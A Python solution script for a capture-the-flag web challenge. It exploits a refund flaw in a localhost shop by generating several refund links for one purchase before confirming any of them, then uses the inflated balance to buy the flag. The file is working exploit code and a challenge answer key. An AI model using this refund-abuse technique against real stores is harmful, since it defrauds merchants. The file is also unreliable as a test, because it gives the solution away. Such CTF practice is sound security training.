#!/usr/bin/env python3
"""
Solution for "The Customer is Always Right" CTF Challenge

Vulnerability: Race condition in refund system
The server generates refund links without immediately marking the transaction as returned.
By visiting /return?id=... multiple times before confirming any refund, we can create
multiple refund requests for the same transaction, allowing us to refund it multiple times.
"""

import requests
from bs4 import BeautifulSoup
import re

# Target URL - Change this to match your deployment
TARGET = "http://localhost:14000" 

def extract_transaction_id(html):
    """Extract transaction ID from the HTML"""
    soup = BeautifulSoup(html, 'html.parser')
    refund_links = soup.find_all('a', href=re.compile(r'/return\?id='))
    if refund_links:
        href = refund_links[0]['href']
        match = re.search(r'id=([a-f0-9-]+)', href)
        if match:
            return match.group(1)
    return None

def extract_balance(html):
    """Extract current balance from HTML"""
    match = re.search(r'Your Balance: \$(\d+)', html)
    if match:
        return int(match.group(1))
    return 0

def extract_flag(html):
    """Extract flag from HTML - get all flags and return the real one"""
    flags = re.findall(r'(csl\{[^}]+\})', html)
    # The real flag contains the specific text from the challenge
    for flag in flags:
        if 'sql_table' in flag or 'memory' in flag:
            return flag
    # If we didn't find the real flag, return the last one found
    if flags:
        return flags[-1]
    return None

def exploit():
    print("[*] Starting exploit for 'The Customer is Always Right'")
    print(f"[*] Target: {TARGET}")
    
    # Create a session to maintain cookies
    session = requests.Session()
    
    # Step 1: Visit home page to initialize session
    print("\n[+] Step 1: Initializing session...")
    r = session.get(TARGET)
    balance = extract_balance(r.text)
    print(f"[+] Starting balance: ${balance}")
    
    # Step 2: Buy a cheap item to get a transaction
    print("\n[+] Step 2: Buying Fake Flag #1 ($10)...")
    r = session.post(f"{TARGET}/buy", data={'product_id': 'fake_flag_1'})
    balance = extract_balance(r.text)
    print(f"[+] Balance after purchase: ${balance}")
    
    # Step 3: Get the transaction ID
    r = session.get(TARGET)
    transaction_id = extract_transaction_id(r.text)
    if not transaction_id:
        print("[-] Failed to find transaction ID")
        return
    print(f"[+] Transaction ID: {transaction_id}")
    
    # Step 4: Exploit - Generate multiple refund requests
    print("\n[+] Step 3: Exploiting race condition...")
    print("[+] Generating multiple refund requests without confirming...")
    
    refund_links = []
    num_refunds = 6  # Generate 6 refund requests to get enough money
    
    for i in range(num_refunds):
        r = session.get(f"{TARGET}/return?id={transaction_id}", allow_redirects=False)
        if r.status_code == 302:
            location = r.headers.get('Location', '')
            if '/confirm_refund?id=' in location:
                # Extract the full URL
                if location.startswith('http'):
                    refund_url = location
                else:
                    refund_url = TARGET + location
                refund_links.append(refund_url)
                print(f"[+] Generated refund request {i+1}/{num_refunds}")
    
    print(f"[+] Generated {len(refund_links)} refund requests")
    
    # Step 5: Confirm all refunds
    print("\n[+] Step 4: Confirming all refunds...")
    for i, refund_url in enumerate(refund_links):
        r = session.get(refund_url)
        balance = extract_balance(r.text)
        print(f"[+] Confirmed refund {i+1}/{len(refund_links)} - Balance: ${balance}")
    
    # Step 6: Check final balance
    r = session.get(TARGET)
    final_balance = extract_balance(r.text)
    print(f"\n[+] Final balance: ${final_balance}")
    
    # Step 7: Buy the real flag
    if final_balance >= 100:
        print("\n[+] Step 5: Buying Real Flag ($100)...")
        r = session.post(f"{TARGET}/buy", data={'product_id': 'real_flag'})
        
        # Extract the flag
        r = session.get(TARGET)
        flag = extract_flag(r.text)
        
        if flag:
            print(f"\n[+] SUCCESS! Flag captured: {flag}")
            return flag
        else:
            print("[-] Flag not found in response")
    else:
        print(f"[-] Insufficient funds. Need $100, have ${final_balance}")
        print("[*] Try increasing num_refunds variable")
    
    return None

if __name__ == '__main__':
    try:
        flag = exploit()
        if flag:
            print(f"\n{'='*60}")
            print(f"FLAG: {flag}")
            print(f"{'='*60}")
    except Exception as e:
        print(f"[-] Error: {e}")
        import traceback
        traceback.print_exc()
